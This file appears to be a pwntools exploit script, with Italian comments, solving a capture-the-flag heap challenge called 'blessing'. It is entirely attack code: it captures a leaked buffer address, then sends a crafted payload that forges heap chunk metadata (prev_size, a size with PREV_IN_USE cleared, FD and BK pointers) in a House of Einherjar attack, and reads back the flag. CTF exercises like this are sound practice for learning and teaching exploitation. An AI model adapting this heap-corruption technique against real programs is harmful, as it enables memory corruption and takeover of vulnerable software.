#!/usr/bin/env python3

from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = process('./blessing')

# 1. Ottieni l'indirizzo di buffer1
p.recvuntil(b"Please accept this: 0x")
buffer1_addr = int(p.recvline().strip(), 16)
# log.info(f"buffer1 @ {hex(buffer1_addr)}")

# 2. Imposta la dimensione per sovrascrivere i metadati dell'heap
size = 32
p.sendlineafter(b"Give me the song", str(size).encode())

# 3. Costruisci il payload per House of Einherjar
prev_size = 0x20  # Distanza dal fake chunk
corrupted_size = 0x20  # Size con PREV_IN_USE=0
fake_chunk_addr = buffer1_addr - 0x10  # Indirizzo del fake chunk

payload = p64(prev_size)
payload += p64(corrupted_size)
payload += p64(fake_chunk_addr)  # FD
payload += p64(fake_chunk_addr)  # BK

p.sendafter(b"Now tell me the song", payload)

# 4. Ottieni la flag
p.recvuntil(b"Checking access...")
flag = p.recvall().split(b'\n')[-2].decode()
# log.success(f"Flag: {flag}")
